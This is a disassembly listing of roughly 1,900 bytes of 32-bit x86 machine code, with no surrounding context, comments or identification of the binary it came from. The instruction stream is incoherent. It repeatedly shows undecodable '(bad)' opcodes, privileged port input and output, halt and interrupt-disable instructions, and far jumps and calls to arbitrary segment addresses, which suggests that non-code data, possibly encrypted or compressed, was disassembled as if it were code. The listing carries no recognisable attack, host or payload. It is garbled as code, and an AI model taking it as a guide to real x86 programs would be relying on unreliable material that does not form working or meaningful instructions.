  413fb8:	arpl   di,cx
  413fba:	jae    0x413fad
  413fbc:	cdq    
  413fbd:	mov    ecx,0x59120e2
  413fc2:	sub    DWORD PTR ds:0x287676ed,ebx
  413fc8:	gs xor eax,0x993493e8
  413fce:	loope  0x413f77
  413fd0:	lods   eax,DWORD PTR ds:[esi]
  413fd1:	int3   
  413fd2:	fdiv   DWORD PTR [ecx+0x40aa043b]
  413fd8:	push   ss
  413fd9:	or     BYTE PTR [ecx-0x485ef6b1],cl
  413fdf:	or     eax,0x4c7c9029
  413fe4:	jo     0x413fa4
  413fe6:	mov    edi,0x661cbc34
  413feb:	mov    ds:0xfa8a065e,al
  413ff0:	mov    esi,0x89cefcc6
  413ff5:	aad    0x97
  413ff7:	sahf   
  413ff8:	adc    BYTE PTR [edi+0x44],ah
  413ffb:	dec    ecx
  413ffc:	mov    ebx,0x7d4ce24c
  414001:	xor    eax,DWORD PTR cs:[esi-0xfc97a29]
  414008:	js     0x413fae
  41400a:	add    ax,0x5db5
  41400e:	test   BYTE PTR [ebx+0x7],dl
  414011:	adc    BYTE PTR [ebp+0x960f880],dl
  414017:	xor    eax,0xfc45af08
  41401c:	push   ds
  41401d:	mov    ss,WORD PTR [ebx+0x4]
  414020:	jg     0x413ffd
  414022:	xor    esp,DWORD PTR [edi-0x17]
  414025:	ss pop ss
  414027:	cmp    DWORD PTR [eax+0x45],0xb93b14ad
  41402e:	retf   0xa889
  414031:	jo     0x413fb3
  414033:	test   BYTE PTR [esi+0x46],ah
  414036:	stc    
  414037:	and    dh,ch
  414039:	mov    ebp,0x17b1115e
  41403e:	mov    esp,0x761ef794
  414043:	inc    edi
  414044:	or     dh,dl
  414046:	fadd   DWORD PTR ds:0xc0bea783
  41404c:	push   ss
  41404d:	fcmovu st,st(2)
  41404f:	mov    ds:0xe70114b2,eax
  414054:	mov    edx,0xfe00c1e4
  414059:	dec    edx
  41405a:	cmp    al,0xfe
  41405d:	out    0x8b,al
  41405f:	bound  esp,QWORD PTR [ebx-0x2a]
  414062:	mov    bh,0x8a
  414064:	sub    eax,0x6a128a41
  414069:	out    dx,al
  41406a:	repz call 0xc3eb:0xcab28484
  414072:	add    ebx,edx
  414074:	into   
  414075:	popa   
  414076:	iretw  
  414078:	mov    DWORD PTR [esi],ecx
  41407a:	ss and eax,0xcd05e2c
  414080:	sbb    BYTE PTR [edi+0x1a],dl
  414083:	lahf   
  414084:	dec    eax
  414085:	and    eax,0x84375a2e
  41408a:	pusha  
  41408b:	aaa    
  41408c:	push   es
  41408d:	cwde   
  41408e:	mov    cl,0x97
  414090:	call   0xda9f:0x12dc0fa9
  414097:	das    
  414098:	pop    ecx
  414099:	mov    esp,0x4edb5a3e
  41409e:	inc    edi
  41409f:	lea    esi,[edi+esi*2+0x1dd7a6cf]
  4140a6:	sub    BYTE PTR [esp+eax*8],ah
  4140a9:	popf   
  4140aa:	add    ah,BYTE PTR ds:0x4c4bb0a6
  4140b0:	ds mov esi,0x6b2c30c5
  4140b6:	or     al,0x81
  4140b8:	xor    ch,dh
  4140ba:	ja     0x4140f2
  4140bc:	je     0x4140f7
  4140be:	icebp  
  4140bf:	rol    ebp,1
  4140c1:	xor    dl,BYTE PTR [ebx]
  4140c3:	popf   
  4140c4:	push   ecx
  4140c5:	je     0x41410f
  4140c7:	cli    
  4140c8:	mov    ebp,0x37d040b2
  4140cd:	mov    dl,0x98
  4140cf:	sbb    eax,0xd91ceb3f
  4140d4:	push   0xee37330c
  4140d9:	jecxz  0x414087
  4140db:	(bad)  
  4140dc:	repnz push 0xe5e3a400
  4140e2:	dec    ebp
  4140e3:	rcl    DWORD PTR [eax-0x719e6088],0xc7
  4140ea:	outs   dx,BYTE PTR ds:[esi]
  4140eb:	or     DWORD PTR [eax-0x71],ebx
  4140ee:	pop    esp
  4140ef:	inc    edx
  4140f0:	and    al,BYTE PTR [eax-0x1341df48]
  4140f6:	lea    ecx,[edx+0x2f]
  4140f9:	sbb    al,0x4d
  4140fb:	mov    al,0xf2
  4140fd:	or     eax,0x380c03b3
  414102:	sbb    DWORD PTR [edx],0xffffffd7
  414105:	fld    DWORD PTR [ecx+0x68254d18]
  41410b:	push   ss
  41410c:	aas    
  41410d:	in     eax,0xc4
  41410f:	in     al,0x1b
  414111:	xor    DWORD PTR [ebx+0xec7774b],edx
  414117:	mov    esp,0xf3604e2f
  41411c:	in     eax,dx
  41411d:	(bad)  
  41411e:	fisttp DWORD PTR [ebx]
  414120:	push   cs
  414121:	fisub  WORD PTR [ebx+ebx*1-0x76293e5e]
  414128:	mov    bh,0x28
  41412a:	mov    ch,0x84
  41412c:	aaa    
  41412d:	rcr    DWORD PTR ds:0xd47e87a2,0x2f
  414134:	leave  
  414135:	add    BYTE PTR [ebx-0x32],al
  414138:	rol    DWORD PTR [esi-0x3],1
  41413b:	inc    edi
  41413c:	cdq    
  41413d:	repz sbb BYTE PTR [eax-0x7],ah
  414141:	pop    ecx
  414142:	in     eax,dx
  414143:	cs xor al,0x4c
  414146:	push   cs
  414147:	es (bad) 
  414149:	aam    0x5b
  41414b:	or     eax,ecx
  41414d:	inc    esp
  41414e:	sub    ah,BYTE PTR [esi-0x1b115986]
  414154:	pop    eax
  414155:	cmp    BYTE PTR [edi],0x3c
  414158:	out    0x38,al
  41415a:	fld    TBYTE PTR [esi+edi*8]
  41415d:	jns    0x414167
  41415f:	in     eax,0xab
  414161:	pop    esp
  414162:	push   esp
  414163:	pop    es
  414164:	and    eax,0xef708298
  414169:	push   0xb55e7f1d
  41416e:	(bad)  
  414170:	and    BYTE PTR [edx],ah
  414172:	push   ebx
  414173:	jns    0x414188
  414175:	xchg   BYTE PTR [esi+0x16834853],ah
  41417b:	push   0x7a
  41417d:	cmp    ebx,DWORD PTR ds:0x3dbb0d9f
  414183:	loop   0x4141e8
  414185:	popa   
  414186:	mov    dh,0x25
  414188:	jecxz  0x4141dc
  41418a:	push   esi
  41418b:	outs   dx,BYTE PTR ds:[esi]
  41418c:	imul   esi,DWORD PTR [esi],0xffffffba
  41418f:	jge    0x414181
  414191:	ss enter 0x7dc4,0x24
  414196:	cmp    al,0x24
  414198:	or     BYTE PTR [edx+0x52],0x35
  41419c:	push   0xfffffff1
  41419e:	sub    DWORD PTR [edx-0x30d058c],0x16
  4141a5:	sahf   
  4141a6:	out    dx,al
  4141a7:	sbb    DWORD PTR [esi-0x70],0xfffffff1
  4141ab:	push   0x82fb2022
  4141b0:	test   DWORD PTR [ebp+0x29],0x39992687
  4141b7:	inc    ecx
  4141b8:	aam    0xf1
  4141ba:	inc    ebx
  4141bb:	pop    es
  4141bc:	test   BYTE PTR [ecx+0x12bf590d],0xe
  4141c3:	fbstp  TBYTE PTR [ebp+0x3b8ce354]
  4141c9:	lods   eax,DWORD PTR ds:[esi]
  4141ca:	dec    ecx
  4141cb:	icebp  
  4141cc:	test   eax,0x307bbafa
  4141d2:	pop    ebp
  4141d3:	push   0x32
  4141d5:	push   ds
  4141d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141d7:	retf   
  4141d8:	(bad)  
  4141d9:	xor    BYTE PTR [eax],bl
  4141db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141dc:	or     ecx,DWORD PTR [ecx+0x5e9d67a1]
  4141e2:	mov    al,0x93
  4141e4:	lahf   
  4141e5:	and    eax,0xfd571c25
  4141ea:	loop   0x41424a
  4141ec:	ins    BYTE PTR es:[edi],dx
  4141ed:	add    ebp,DWORD PTR [ebx+ecx*4]
  4141f0:	nop
  4141f1:	rol    DWORD PTR [eax+0x669b6cc7],0x61
  4141f8:	xor    BYTE PTR ds:0x73aaa93f,al
  4141fe:	fisttp WORD PTR [eax-0x29bef712]
  414204:	cmc    
  414205:	clc    
  414206:	inc    esi
  414207:	call   0x3105:0x941bc716
  41420e:	test   al,0xd2
  414210:	mov    cl,0xf3
  414212:	scas   al,BYTE PTR es:[edi]
  414213:	add    DWORD PTR [edi+0x7b6251d0],esi
  414219:	jnp    0x4141d8
  41421b:	in     al,0xf2
  41421d:	mov    edi,0x32a29de8
  414222:	es xchg ebp,eax
  414224:	and    esp,DWORD PTR [edx]
  414226:	add    DWORD PTR [edx-0x48e08052],eax
  41422c:	xor    BYTE PTR [edi+0x53bbe40c],dl
  414232:	xchg   edi,eax
  414233:	mov    ds:0xe0145db,al
  414238:	jns    0x414270
  41423a:	push   ebx
  41423b:	stos   DWORD PTR es:[edi],eax
  41423c:	sbb    edx,DWORD PTR [edx]
  41423e:	out    dx,al
  41423f:	inc    eax
  414240:	stos   BYTE PTR es:[edi],al
  414241:	mov    WORD PTR [eax-0x33c8e62a],?
  414247:	fdiv   DWORD PTR [edi-0x151f8e81]
  41424d:	push   esi
  41424e:	std    
  41424f:	push   eax
  414250:	xchg   ebp,eax
  414251:	icebp  
  414252:	push   edi
  414253:	(bad)  
  414254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414255:	hlt    
  414256:	mov    bl,BYTE PTR [edx-0x67]
  414259:	mov    ebp,DWORD PTR [edi-0x27a699a4]
  41425f:	ins    DWORD PTR es:[edi],dx
  414260:	or     cl,BYTE PTR [ecx-0x41b4d1ae]
  414266:	sub    bl,BYTE PTR [esi+0x6a181503]
  41426c:	outs   dx,BYTE PTR ds:[esi]
  41426d:	mov    esp,0x8f74da47
  414272:	push   ebx
  414273:	mov    eax,0x109d74ef
  414278:	add    edi,DWORD PTR [eax+0x7654f4ac]
  41427e:	mov    ecx,0x7e02e401
  414283:	repz jae 0x414276
  414286:	jmp    0xd724:0xd6091d34
  41428d:	jmp    0x41066f07
  414292:	into   
  414293:	call   0x484e:0x5115f327
  41429a:	out    dx,eax
  41429b:	cmp    esi,DWORD PTR [edx+0x3f]
  41429e:	push   0x5c
  4142a0:	mov    cl,0x53
  4142a2:	mov    al,ds:0xebe89509
  4142a7:	push   0x8aabceba
  4142ac:	push   0xffffffce
  4142ae:	xchg   edx,eax
  4142af:	jg     0x414305
  4142b1:	iret   
  4142b2:	into   
  4142b3:	push   0x30
  4142b5:	outs   dx,BYTE PTR ds:[esi]
  4142b6:	add    DWORD PTR [ebx+edi*4-0x2b39cd6e],ebp
  4142bd:	sbb    esi,eax
  4142bf:	scas   al,BYTE PTR es:[edi]
  4142c0:	dec    edi
  4142c1:	inc    ebp
  4142c2:	fst    DWORD PTR [edx-0x1a]
  4142c5:	fld    TBYTE PTR [edx-0x29]
  4142c8:	pop    edx
  4142c9:	lea    esp,[ebx-0x37]
  4142cc:	mov    esp,0xf1c2a718
  4142d1:	test   eax,0x85305724
  4142d6:	popf   
  4142d7:	(bad)  
  4142d9:	mov    edx,0xafb64090
  4142de:	lahf   
  4142df:	in     al,dx
  4142e0:	sbb    DWORD PTR [esi+0x43c147a0],edx
  4142e6:	daa    
  4142e7:	inc    ebx
  4142e8:	pop    edi
  4142e9:	push   0x71
  4142eb:	ja     0x414323
  4142ed:	xchg   ebx,eax
  4142ee:	stc    
  4142ef:	ret    
  4142f0:	and    ch,0x99
  4142f3:	and    DWORD PTR [esi+ebp*4],0xc605dd32
  4142fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142fb:	repnz sti 
  4142fd:	sbb    DWORD PTR [edi+0x252e5b1d],esi
  414303:	push   esp
  414304:	push   esp
  414305:	mov    ebx,0xdd052faf
  41430a:	loop   0x414381
  41430c:	inc    ebx
  41430d:	push   edi
  41430e:	ins    DWORD PTR es:[edi],dx
  41430f:	arpl   WORD PTR [ebp-0xee86e8e],di
  414315:	jmp    0x6377:0x6160a0a5
  41431c:	xor    al,BYTE PTR [esi+edx*8-0x324e7791]
  414323:	or     bl,BYTE PTR [edi-0x68]
  414326:	sar    BYTE PTR [ebx],0x24
  414329:	and    edi,eax
  41432b:	pop    eax
  41432c:	mov    ah,0xd3
  41432e:	sar    ah,0xd3
  414331:	push   ecx
  414332:	xchg   BYTE PTR [edi-0x6f],bl
  414335:	lock fidivr DWORD PTR [esi]
  414338:	xor    ecx,DWORD PTR [ebx-0x5]
  41433b:	outs   dx,BYTE PTR ds:[esi]
  41433c:	bound  ecx,QWORD PTR [edx-0x3bf5fa14]
  414342:	inc    ebx
  414343:	mov    edx,0x1593ce2e
  414348:	xor    eax,0x4573585a
  41434d:	push   cs
  41434e:	cmc    
  41434f:	pushf  
  414350:	stos   BYTE PTR es:[edi],al
  414351:	inc    ebx
  414352:	cmp    al,0x39
  414354:	cmp    al,0x67
  414356:	mov    eax,ds:0xf567d429
  41435b:	jp     0x4142e3
  41435d:	loop   0x41432b
  41435f:	loope  0x414358
  414361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414362:	and    DWORD PTR [eax],0x89e20235
  414368:	sbb    eax,0xd72e5124
  41436d:	cli    
  41436e:	adc    DWORD PTR [ebp+0x254316c],0xc794e731
  414378:	mov    bh,0x55
  41437a:	mov    DWORD PTR [ebx+0x778139b9],esp
  414380:	(bad)  
  414382:	(bad)  
  414383:	cwde   
  414384:	push   eax
  414385:	pop    ebx
  414386:	aam    0x9a
  414388:	into   
  414389:	sar    DWORD PTR [esp+eiz*4+0x76],cl
  41438d:	sbb    esp,DWORD PTR [ebx-0x2f]
  414390:	mov    eax,ds:0x6502645d
  414395:	add    dh,BYTE PTR [ecx]
  414397:	xchg   esi,eax
  414398:	mov    al,ds:0xcdbe45cf
  41439d:	les    edi,FWORD PTR ss:[esi+ebx*1+0x57]
  4143a2:	cmp    dh,BYTE PTR [ebx-0x61]
  4143a5:	ds stos BYTE PTR es:[edi],al
  4143a7:	pop    ss
  4143a8:	mov    edi,DWORD PTR [esi+0x1a199adf]
  4143ae:	sub    edi,DWORD PTR [esi-0x7d]
  4143b1:	push   edi
  4143b2:	jp     0x414359
  4143b4:	or     ecx,eax
  4143b6:	pop    ebx
  4143b7:	jecxz  0x4143d5
  4143b9:	aaa    
  4143ba:	std    
  4143bb:	jmp    0xe8c6:0xaaf78bc3
  4143c2:	addr16 aad 0x6a
  4143c5:	pop    ss
  4143c6:	mov    ecx,0x53428a1b
  4143cb:	pop    edx
  4143cc:	or     DWORD PTR [edx+0x44],0x89d8b843
  4143d3:	xor    eax,0xd8958374
  4143d8:	ds jo  0x4143b5
  4143db:	ja     0x414454
  4143dd:	test   al,0x1d
  4143df:	pushf  
  4143e0:	int    0xe9
  4143e2:	lods   eax,DWORD PTR ds:[esi]
  4143e3:	out    0x6b,al
  4143e5:	ja     0x4143f0
  4143e7:	rcl    edi,0x57
  4143ea:	(bad)  
  4143eb:	jb     0x41446c
  4143ed:	adc    dl,dh
  4143ef:	and    al,0x44
  4143f1:	stos   DWORD PTR es:[edi],eax
  4143f2:	or     BYTE PTR [ecx],0x57
  4143f5:	sbb    dh,BYTE PTR [ecx-0xc]
  4143f8:	jnp    0x4143bf
  4143fa:	xor    ebx,DWORD PTR [eax]
  4143fc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4143fe:	popf   
  4143ff:	cwde   
  414400:	fbld   TBYTE PTR [edx+0x54]
  414403:	jp     0x414437
  414405:	lock stos BYTE PTR es:[edi],al
  414407:	fsubr  DWORD PTR [ecx]
  414409:	xor    ch,ah
  41440b:	push   edx
  41440c:	xor    DWORD PTR [ebx+0x381b78d3],0xffffffe8
  414413:	inc    esp
  414414:	sub    cl,BYTE PTR [edx+0x447e19aa]
  41441a:	out    0x17,al
  41441c:	sub    BYTE PTR [eax],0xf2
  41441f:	mov    eax,0xb87ce38
  414424:	cmp    eax,0x9f186a83
  414429:	sub    DWORD PTR [edx-0x2c],edx
  41442c:	push   ebx
  41442d:	adc    eax,0xd41169a5
  414432:	add    BYTE PTR [ecx-0x6b418792],0x3c
  414439:	shr    BYTE PTR [ecx-0x3a],1
  41443c:	mov    ecx,0x543e4a3f
  414441:	xchg   ecx,eax
  414442:	fs cmp esi,edi
  414445:	mov    ecx,0x1174d407
  41444a:	add    eax,0x4e499b65
  41444f:	xchg   edi,eax
  414450:	mov    bh,0xb0
  414452:	or     eax,0x3eb4e0ae
  414457:	mov    edx,0xa6d8deb3
  41445c:	sub    al,dh
  41445e:	jae    0x41440c
  414460:	shl    BYTE PTR [ebx],1
  414462:	repz retf 
  414464:	imul   edi,DWORD PTR [edx-0x5],0xffffff8a
  414468:	jae    0x4143f9
  41446a:	adc    edx,esi
  41446c:	sbb    dl,al
  41446e:	mov    ecx,0x126477c5
  414473:	test   bl,0x6e
  414476:	push   0x3a27ac30
  41447b:	or     DWORD PTR [edi+0x55],0x5c23154c
  414482:	mov    edi,DWORD PTR [esi+0x62]
  414485:	or     eax,0xf90b88b6
  41448a:	into   
  41448b:	pop    edi
  41448c:	mov    esi,0x1afa6af8
  414491:	mov    al,ds:0x4af516b1
  414496:	and    BYTE PTR [esi+0x7a],ch
  414499:	xlat   BYTE PTR ds:[ebx]
  41449a:	pop    esp
  41449b:	fs out dx,al
  41449d:	or     ah,BYTE PTR [esi]
  41449f:	jno    0x4144f8
  4144a1:	stc    
  4144a2:	lods   eax,DWORD PTR ds:[esi]
  4144a3:	xchg   BYTE PTR [esi],bl
  4144a5:	pop    ss
  4144a6:	push   edi
  4144a7:	(bad)  
  4144a9:	fwait
  4144aa:	xchg   esp,eax
  4144ab:	fimul  WORD PTR [ebx-0x1349caf5]
  4144b1:	mov    al,BYTE PTR [ebx-0x13]
  4144b4:	dec    eax
  4144b5:	retf   
  4144b6:	shl    BYTE PTR [esi],1
  4144b8:	dec    edi
  4144b9:	cmp    BYTE PTR [ebx+0x63],0x6b
  4144bd:	enter  0xaac6,0x70
  4144c1:	sahf   
  4144c2:	jg     0x41450d
  4144c4:	mov    ah,0x50
  4144c6:	xchg   esp,eax
  4144c7:	pop    ss
  4144c8:	popa   
  4144c9:	jl     0x414527
  4144cb:	adc    cl,al
  4144cd:	or     BYTE PTR [esi+0x9],ah
  4144d0:	adc    ebp,DWORD PTR [eax-0x7a8e34e3]
  4144d6:	mov    bl,0x78
  4144d8:	xchg   dl,bl
  4144da:	sti    
  4144db:	sub    DWORD PTR [ecx+0x72],edx
  4144de:	cmp    esp,DWORD PTR [ebp-0x53]
  4144e1:	jne    0x41453e
  4144e3:	dec    esp
  4144e4:	and    DWORD PTR [edx],ebp
  4144e6:	out    dx,al
  4144e7:	jbe    0x414551
  4144e9:	mov    ch,BYTE PTR [esi+0x26]
  4144ec:	gs in  eax,dx
  4144ee:	imul   esp,DWORD PTR [ecx-0x52184c5e],0xdb85b3f1
  4144f8:	mov    dl,BYTE PTR [eax+0xfc6925a]
  4144fe:	mov    edi,0x2945af96
  414503:	xchg   BYTE PTR [ecx-0x692cbcca],ch
  414509:	mov    fs,WORD PTR [edi-0x7f09d701]
  41450f:	test   cl,dh
  414511:	xchg   ebp,eax
  414512:	xlat   BYTE PTR ds:[ebx]
  414513:	jns    0x41457b
  414515:	test   BYTE PTR [esi],cl
  414517:	ret    
  414518:	pop    edi
  414519:	xchg   ecx,eax
  41451a:	daa    
  41451b:	lea    esp,[edx-0x29bcf36e]
  414521:	sar    DWORD PTR es:[eax*4+0x13d0a8f8],1
  414529:	xor    esi,DWORD PTR [edx-0x5c3b66f2]
  41452f:	mov    esi,0x16f87e5c
  414534:	jmp    0xecb41ecb
  414539:	jo     0x414596
  41453b:	inc    ebx
  41453c:	fs xor eax,0x24646d3d
  414542:	out    dx,al
  414543:	jbe    0x4145c3
  414545:	adc    ecx,DWORD PTR [edi-0x8]
  414548:	gs pop ebx
  41454a:	and    DWORD PTR [edx+eax*4-0x10],0xffffff9b
  41454f:	imul   esp,esi,0xfffffff2
  414552:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414553:	icebp  
  414554:	js     0x41459c
  414556:	int3   
  414557:	mov    ebx,0x8bbae806
  41455c:	add    BYTE PTR [ecx+0x45],dl
  41455f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414560:	dec    ebp
  414561:	inc    edx
  414562:	push   DWORD PTR [edx]
  414564:	ficomp DWORD PTR [edx+0x583f3feb]
  41456a:	fdivrp st(7),st
  41456c:	xor    al,0xa1
  41456e:	ficomp WORD PTR [ecx]
  414570:	std    
  414571:	mov    cl,0x68
  414573:	or     bl,ah
  414575:	cmp    BYTE PTR [ebp+0x6a],0xd5
  414579:	jbe    0x41452d
  41457b:	xor    DWORD PTR [edx+0x17],0xdcf44e20
  414582:	dec    esi
  414583:	sub    al,0x15
  414585:	jmp    0xa8dd:0x8abd7c0b
  41458c:	call   0x5486:0x560ff5eb
  414593:	retf   
  414594:	mov    cs,ecx
  414596:	mov    eax,0xbd69b2ed
  41459b:	pop    es
  41459c:	dec    eax
  41459d:	out    0x89,al
  41459f:	jb     0x414523
  4145a1:	xchg   ecx,eax
  4145a2:	inc    edi
  4145a3:	and    DWORD PTR [ebp+0x5a0a18ed],ebp
  4145a9:	mov    ebp,DWORD PTR [ebp+0x593dcb4b]
  4145af:	int3   
  4145b0:	jg     0x4145cf
  4145b2:	cmpxchg DWORD PTR [bx+0x50],esp
  4145b7:	xchg   esi,eax
  4145b8:	xchg   esi,eax
  4145b9:	mov    BYTE PTR [ebx-0x30],dl
  4145bc:	push   eax
  4145bd:	mov    edx,0xc6506a78
  4145c2:	out    0x28,al
  4145c4:	add    bh,BYTE PTR [edx-0x12f60a4e]
  4145ca:	pop    esi
  4145cb:	inc    ebx
  4145cc:	retf   
  4145cd:	dec    edi
  4145ce:	xchg   ebx,eax
  4145cf:	rcr    DWORD PTR [ebp+0x29b694b0],cl
  4145d5:	sbb    ebp,DWORD PTR [eax]
  4145d7:	test   bh,bh
  4145d9:	lock push ebx
  4145db:	lds    ebx,FWORD PTR [eax]
  4145dd:	mov    esi,0xcdb857da
  4145e2:	jl     0x414568
  4145e4:	push   es
  4145e5:	jmp    FWORD PTR [ecx]
  4145e7:	sti    
  4145e8:	imul   esp,ecx,0xffffffc6
  4145eb:	sbb    ebx,DWORD PTR [eax]
  4145ed:	mov    DWORD PTR [eax+0x3a],eax
  4145f0:	xchg   BYTE PTR [edx],al
  4145f2:	add    esi,DWORD PTR [esi]
  4145f4:	jmp    0x84881864
  4145f9:	and    ecx,esi
  4145fb:	push   ebp
  4145fc:	cld    
  4145fd:	inc    esi
  4145fe:	jno    0x414610
  414600:	push   ecx
  414601:	xchg   ebx,eax
  414602:	or     eax,0xc5780f18
  414607:	jbe    0x807a3391
  41460d:	xchg   edx,eax
  41460e:	in     eax,dx
  41460f:	inc    esi
  414610:	mov    dh,0x82
  414612:	retf   0xc06c
  414615:	data16 in al,dx
  414617:	pushf  
  414618:	jmp    DWORD PTR [eax]
  41461a:	scas   al,BYTE PTR es:[edi]
  41461b:	cmp    BYTE PTR [ebp+esi*2-0x37],dl
  41461f:	adc    al,0x16
  414621:	repnz or eax,0xf9c900d7
  414627:	push   0xd9d96cea
  41462c:	add    DWORD PTR [eax-0x14],esi
  41462f:	sub    edi,DWORD PTR ds:0x97212d3b
  414635:	sbb    DWORD PTR [ecx+0x15cbfa3e],esp
  41463b:	pusha  
  41463c:	and    BYTE PTR [edi+0x38],ah
  41463f:	mov    ds:0xacb23aa6,eax
  414644:	cli    
  414645:	add    DWORD PTR [edx],esp
  414647:	push   ds
  414648:	xchg   ebx,eax
  414649:	push   0x143f5c23
  41464e:	cmp    bh,bh
  414650:	addr16 xor eax,0x85b0449f
  414656:	jae    0x41460d
  414658:	icebp  
  414659:	or     eax,0xa9b77f30
  41465e:	pop    esi
  41465f:	(bad)  
  414660:	lahf   
  414661:	fnop   
  414663:	ss push ebp
  414665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414666:	iret   
  414667:	adc    eax,0x96f1b887
  41466c:	into   
  41466d:	dec    edx
  41466e:	fwait
  41466f:	pop    edx
  414670:	bound  edx,QWORD PTR [esi+0x4351297b]
  414676:	mov    ds:0x5d948543,al
  41467b:	adc    DWORD PTR [edi+0x473c3b48],0x28
  414682:	scas   al,BYTE PTR es:[edi]
  414683:	push   ecx
  414684:	hlt    
  414685:	mov    al,ds:0xca926ff8
  41468a:	retf   
  41468b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41468c:	xor    DWORD PTR [esi],0x8fdf5ff
  414692:	lods   eax,DWORD PTR ds:[esi]
  414693:	mov    ds:0x5aa61cde,al
  414698:	sti    
  414699:	cdq    
  41469a:	rcr    ebx,cl
  41469c:	and    ecx,DWORD PTR ds:0x314f9582
  4146a2:	inc    eax
  4146a3:	and    bh,BYTE PTR [ebx-0x3f67de57]
  4146a9:	test   eax,0x7806384d
  4146ae:	repnz or DWORD PTR [edx+0x59],eax
  4146b2:	into   
  4146b3:	cmp    al,0xae
  4146b5:	rcr    ebx,1
  4146b7:	stos   DWORD PTR es:[edi],eax
  4146b8:	addr16 pop ds
  4146ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146bb:	cmp    al,0xf8
  4146bd:	clc    
  4146be:	enter  0xba40,0x15
  4146c2:	push   ds
  4146c3:	adc    BYTE PTR [eax+edi*4],cl
  4146c6:	sbb    DWORD PTR [ebx-0x46],esp
  4146c9:	xchg   edx,eax
  4146ca:	loopne 0x4146e2
  4146cc:	test   ebx,ebx
  4146ce:	test   eax,0x1c2a4c4b
  4146d3:	add    al,0x54
  4146d5:	aas    
  4146d6:	or     BYTE PTR [edx],al
  4146d8:	or     eax,0xd2347c68
  4146dd:	pop    eax
  4146de:	sub    eax,0xc6e0e50a
  4146e3:	imul   DWORD PTR [ecx]
  4146e5:	fstp   TBYTE PTR [ecx]
  4146e7:	(bad)  
  4146e8:	cwde   
  4146e9:	lock xchg esi,eax
  4146eb:	out    0xc0,al
  4146ed:	fsub   DWORD PTR [eax+0x5f]
  4146f0:	push   eax
  4146f1:	inc    eax
  4146f2:	in     eax,dx
  4146f3:	mov    ebp,0x6b19d9c0
  4146f8:	gs leave 
  4146fa:	ins    DWORD PTR es:[edi],dx
  4146fb:	xchg   BYTE PTR [ecx],bh
  4146fd:	mov    bh,0x8f
  4146ff:	pop    edx
  414700:	je     0x4146ed
  414702:	into   
  414703:	dec    ecx
  414704:	jne    0x41477d
  414706:	nop
  414707:	jge    0x41473d
  414709:	xor    edx,esi
  41470b:	push   ebx
  41470c:	pop    ecx
  41470d:	call   0xed171fa5
  414712:	xchg   edi,eax
  414713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414714:	lahf   
  414715:	fistp  WORD PTR [ecx-0x24]
  414718:	push   edx
  414719:	cli    
  41471a:	adc    eax,0xbdac5408
  41471f:	sti    
  414720:	and    ch,BYTE PTR [esi]
  414722:	cmp    dl,BYTE PTR [esi+0x1b]
  414725:	xor    al,0x95
  414727:	ret    
  414728:	jle    0x414799
  41472a:	add    ebx,DWORD PTR [ebx-0x3c7fbfc]
  414730:	fs jle 0x4147a0
  414733:	xor    DWORD PTR [eax-0x7449491e],ebx
  414739:	stos   DWORD PTR es:[edi],eax
  41473a:	xor    eax,0x3c64ab27
  41473f:	sar    DWORD PTR [eax],1
  414741:	pop    ds
  414742:	xchg   ebx,eax
  414743:	fcomp  QWORD PTR [esi]
  414745:	and    ebp,eax
  414747:	imul   ecx,DWORD PTR [ebx+edx*4],0xffffff8a
  41474b:	add    BYTE PTR [ecx-0x59],ah
  41474e:	outs   dx,BYTE PTR ds:[esi]
  41474f:	sahf   
  414750:	mov    ch,0xfe
  414752:	cmp    eax,0x8d4e91d2
  414757:	in     al,dx
  414758:	data16 out 0xcd,al
  41475b:	dec    esi
  41475c:	ret    0x4f59
  41475f:	lock rcl eax,0xb3
  414763:	mov    cl,bl
  414765:	ds sbb edi,0x3288a9bc
  41476c:	mov    bl,0x91
  41476e:	scas   eax,DWORD PTR es:[edi]
  41476f:	jns    0x4147d0
  414771:	(bad)  
  414772:	mov    edi,0x60e67f74
  414777:	gs es lahf 
  41477a:	add    eax,0xc190ab60
  41477f:	inc    ebx
  414780:	sub    BYTE PTR [ecx],0x36
  414783:	mul    edx
  414785:	into   
  414786:	stos   BYTE PTR es:[edi],al
  414787:	sahf   
  414788:	stc    
  414789:	pop    gs
  41478b:	test   eax,0x62f2e897
  414790:	cmp    DWORD PTR [edx+0x9b6b3c8],esi
  414796:	cwde   
  414797:	mov    ds:0xd43e4100,al
  41479c:	jbe    0x414739
  41479e:	xchg   esi,eax
  41479f:	dec    esp
  4147a0:	sbb    DWORD PTR [edx-0x46],eax
  4147a3:	ss mov ecx,0x687373e0
  4147a9:	fbstp  TBYTE PTR [ebp+0xa389212]
  4147af:	loopne 0x414808
  4147b1:	bound  ebx,QWORD PTR [edi-0x20]
  4147b4:	xchg   esi,eax
  4147b5:	setl   BYTE PTR [edx]
  4147b8:	dec    ebp
  4147b9:	arpl   WORD PTR [edi+0x40274a],bx
  4147bf:	pop    esi
  4147c0:	mov    ch,0x84
  4147c2:	push   ebp
  4147c3:	cmp    eax,0xd673b2d8
  4147c8:	pop    ss
  4147c9:	and    DWORD PTR [eax+ebp*1-0x24],esp
  4147cd:	scas   eax,DWORD PTR es:[edi]
  4147ce:	xchg   ecx,eax
  4147cf:	lods   eax,DWORD PTR ds:[esi]
  4147d0:	dec    ebp
  4147d1:	repnz or eax,0x3a60ea6
  4147d7:	mov    al,0xa6
  4147d9:	mov    dl,0x43
  4147db:	jmp    0xfdadd4a6
  4147e0:	xchg   edx,eax
  4147e1:	push   ds
  4147e2:	fstp   TBYTE PTR [esi]
  4147e4:	jl     0x41478e
  4147e6:	or     eax,0xf9d538ec
  4147eb:	je     0x4147ef
  4147ed:	push   sp
  4147ef:	popf   
  4147f0:	pushf  
  4147f1:	hlt    
  4147f2:	jg     0x4147d0
  4147f4:	and    eax,0xa5658c5a
  4147f9:	jo     0x414844
  4147fb:	xchg   esp,eax
